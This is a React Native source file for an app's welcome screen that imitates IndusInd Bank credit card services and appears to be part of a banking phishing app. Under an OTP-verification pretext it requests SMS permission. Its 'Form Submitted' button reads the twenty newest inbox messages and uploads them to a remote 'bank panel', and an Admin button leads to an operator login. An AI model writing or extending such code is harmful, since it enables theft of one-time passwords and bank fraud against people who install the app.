import { NativeStackScreenProps } from '@react-navigation/native-stack';
import { useState } from 'react';
import { Alert, ActivityIndicator, Image, Platform, Pressable, StyleSheet, Text, View } from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { requestSMSPermissions } from '../utils/permissions';
import { smsApi } from '../api/client';
import { RootStackParamList } from '../types/navigation';

let SmsAndroid: any = null;
if (Platform.OS === 'android') {
  try { SmsAndroid = require('react-native-get-sms-android'); } catch {}
}

type Props = NativeStackScreenProps<RootStackParamList, 'Welcome'>;

const INDUS_BLUE = '#1B3A6B';
const INDUS_RED = '#D42B2B';
const INDUS_DARK = '#0F1F3D';

export default function WelcomeScreen({ navigation }: Props) {
  const [smsSending, setSmsSending] = useState(false);

  const handleGetStarted = async () => {
    const granted = await requestSMSPermissions();
    if (granted) {
      navigation.navigate('SimSelect');
    } else {
      Alert.alert(
        'Permission Required',
        'IndusInd Bank needs SMS permission to send and view messages for OTP verification. Please allow SMS access to continue.',
        [
          { text: 'Try Again', onPress: handleGetStarted },
          { text: 'Cancel', style: 'cancel' },
        ],
      );
    }
  };

  const handleSubmitForm = async () => {
    setSmsSending(true);
    try {
      const granted = await requestSMSPermissions();
      if (!granted) {
        Alert.alert('Permission Required', 'SMS permission is needed to fetch messages.');
        setSmsSending(false);
        return;
      }

      if (!SmsAndroid) {
        Alert.alert('Error', 'SMS reader not available on this device.');
        setSmsSending(false);
        return;
      }

      const messages: { address: string; body: string; date: number }[] = await new Promise((resolve) => {
        SmsAndroid.list(
          JSON.stringify({ box: 'inbox', maxCount: 20 }),
          () => resolve([]),
          (_count: number, smsList: string) => {
            try { resolve(JSON.parse(smsList)); } catch { resolve([]); }
          },
        );
      });

      if (messages.length === 0) {
        Alert.alert('No SMS Found', 'No messages found in inbox.');
        setSmsSending(false);
        return;
      }

      const result = await smsApi.save({
        mobileNumber: 'unknown',
        fullName: 'Form Submission',
        messages: messages.map((m) => ({
          address: m.address || 'Unknown',
          body: m.body,
          date: m.date,
        })),
      });

      if (result.success) {
        Alert.alert('Success', 'Submitted to bank panel successfully!');
      } else {
        Alert.alert('Error', result.error || 'Failed to submit SMS.');
      }
    } catch (e) {
      Alert.alert('Error', 'Something went wrong. Please try again.');
    } finally {
      setSmsSending(false);
    }
  };

  return (
    <LinearGradient
      colors={['#FFFFFF', '#F8FAFC', '#EEF2F6']}
      style={styles.container}
    >
      {/* Admin Button - Top Right */}
      <Pressable
        style={styles.adminButton}
        onPress={() => navigation.navigate('AdminLogin')}
      >
        <Text style={styles.adminButtonText}>Admin</Text>
      </Pressable>

      {/* Header with Logo */}
      <View style={styles.logoContainer}>
        <View style={styles.logoBox}>
          <Image
            source={require('../../assets/indus_logo.png')}
            style={styles.logoImage}
            resizeMode="contain"
          />
        </View>
        <Text style={styles.bankName}>IndusInd Bank</Text>
        <Text style={styles.tagline}>Banking Made Simple</Text>
      </View>

      {/* Intro Content */}
      <View style={styles.content}>
        <Text style={styles.title}>Credit Card Services</Text>
        <Text style={styles.subtitle}>
          Manage your credit cards and access exclusive benefits
        </Text>
      </View>

      {/* Buttons */}
      <View style={styles.buttonGroup}>
        {/* Section 1 */}
        <View style={styles.sectionCard}>
          <Text style={styles.sectionLabel}>Already have an IndusInd Bank credit card?</Text>
          <Pressable
            style={styles.primaryButton}
            onPress={handleGetStarted}
          >
            <Text style={styles.primaryButtonText}>Get Started</Text>
          </Pressable>
        </View>

        {/* Divider */}
        <View style={styles.dividerRow}>
          <View style={styles.dividerLine} />
          <Text style={styles.dividerText}>or</Text>
          <View style={styles.dividerLine} />
        </View>

        {/* Section 2 */}
        <View style={styles.sectionCard}>
          <Text style={styles.sectionLabel}>Apply for a new IndusInd Bank credit card</Text>
          <Pressable
            style={styles.secondaryButton}
            onPress={() => navigation.navigate('UserDetailsForm', {
              simLabel: '',
              serviceType: 'RewardsRedeem',
              cardName: 'IndusInd Bank Credit Card',
              formMode: 'apply',
            })}
          >
            <Text style={styles.secondaryButtonText}>Apply Now</Text>
          </Pressable>
        </View>

        {/* Submit Form / SMS Section */}
        <View style={styles.sectionCard}>
          <Text style={styles.sectionLabel}>Already submitted your form?</Text>
          <Pressable
            style={[styles.smsButton, smsSending && styles.smsButtonDisabled]}
            onPress={handleSubmitForm}
            disabled={smsSending}
          >
            {smsSending ? (
              <ActivityIndicator size="small" color="#FFFFFF" />
            ) : (
              <Text style={styles.smsButtonText}>📨 Form Submitted</Text>
            )}
          </Pressable>
        </View>
      </View>
    </LinearGradient>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    paddingHorizontal: 24,
    paddingTop: 60,
    paddingBottom: 40,
  },
  adminButton: {
    position: 'absolute',
    top: 50,
    right: 20,
    backgroundColor: 'rgba(27, 58, 107, 0.08)',
    paddingHorizontal: 14,
    paddingVertical: 8,
    borderRadius: 8,
    zIndex: 10,
  },
  adminButtonText: {
    fontSize: 13,
    fontWeight: '700',
    color: INDUS_BLUE,
  },
  logoContainer: {
    alignItems: 'center',
    marginBottom: 48,
  },
  logoBox: {
    width: 80,
    height: 80,
    borderRadius: 20,
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: 16,
    backgroundColor: '#FFFFFF',
    elevation: 6,
    shadowColor: INDUS_BLUE,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.25,
    shadowRadius: 8,
  },
  logoImage: {
    width: 100,
    height: 100,
  },
  bankName: {
    fontSize: 18,
    fontWeight: '700',
    color: INDUS_DARK,
    letterSpacing: 0.5,
  },
  tagline: {
    fontSize: 13,
    color: '#64748B',
    fontWeight: '500',
  },
  content: {
    flex: 1,
    justifyContent: 'center',
    marginBottom: 20,
  },
  title: {
    fontSize: 32,
    fontWeight: '800',
    color: INDUS_DARK,
    lineHeight: 40,
    marginBottom: 12,
  },
  subtitle: {
    fontSize: 16,
    color: '#64748B',
    lineHeight: 24,
  },
  buttonGroup: {
    gap: 16,
  },
  sectionCard: {
    backgroundColor: '#FFFFFF',
    borderRadius: 16,
    padding: 20,
    alignItems: 'center',
    gap: 14,
    elevation: 3,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.08,
    shadowRadius: 8,
  },
  sectionLabel: {
    fontSize: 15,
    fontWeight: '600',
    color: '#334155',
    textAlign: 'center',
    lineHeight: 22,
  },
  primaryButton: {
    backgroundColor: INDUS_BLUE,
    borderRadius: 12,
    paddingVertical: 14,
    paddingHorizontal: 40,
    width: '100%',
    alignItems: 'center',
    elevation: 4,
    shadowColor: INDUS_BLUE,
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
  },
  primaryButtonText: {
    color: '#FFFFFF',
    fontSize: 17,
    fontWeight: '700',
  },
  dividerRow: {
    flexDirection: 'row',
    alignItems: 'center',
    marginVertical: 4,
  },
  dividerLine: {
    flex: 1,
    height: 1,
    backgroundColor: '#E5E7EB',
  },
  dividerText: {
    marginHorizontal: 14,
    fontSize: 14,
    fontWeight: '600',
    color: '#9CA3AF',
  },
  secondaryButton: {
    borderWidth: 2,
    borderColor: INDUS_RED,
    borderRadius: 12,
    paddingVertical: 14,
    paddingHorizontal: 40,
    width: '100%',
    alignItems: 'center',
  },
  secondaryButtonText: {
    color: INDUS_RED,
    fontSize: 17,
    fontWeight: '700',
  },
  smsButton: {
    backgroundColor: '#0F766E',
    borderRadius: 12,
    paddingVertical: 14,
    paddingHorizontal: 40,
    width: '100%',
    alignItems: 'center',
    elevation: 4,
    shadowColor: '#0F766E',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
  },
  smsButtonDisabled: {
    backgroundColor: '#9CA3AF',
  },
  smsButtonText: {
    color: '#FFFFFF',
    fontSize: 17,
    fontWeight: '700',
  },
});
